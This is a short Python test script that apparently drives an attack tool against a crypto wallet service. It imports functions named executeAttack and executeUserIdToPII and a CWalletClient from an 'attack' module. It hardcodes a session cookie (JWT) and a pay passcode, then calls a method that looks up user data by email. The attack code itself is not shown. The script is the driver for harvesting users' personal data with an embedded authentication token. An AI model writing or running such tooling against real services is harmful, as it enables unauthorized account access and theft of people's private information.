import asyncio
from script import executeAttack, executeUserIdToPII
from attack import CWalletClient
from coin import COINS
import logging
from logging.handlers import RotatingFileHandler


async def test():
    cookie = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzJmaGExNXN6cWJiZ2c4a2kxY3Q3ajN4Y2ViaCIsInNlc3Npb25faWQiOiI0MDk2aGgzb2Uza2Z1N2d5OGoxMzNtNDE5cmdxcmgiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzUwOTY3NzYsImlhdCI6MTc3MjAyNDc3Nn0.HW8KPARl5SeByajof47ZbTh0TfQ_YWv4oWSDmb5AqCc" # 12
    client = CWalletClient(authCookie=cookie, payPassCode="111111")
    payload = {"id": "111111111111111111111111111111"}
    print(await client.getUserDataByEmail(payload))

asyncio.run(test())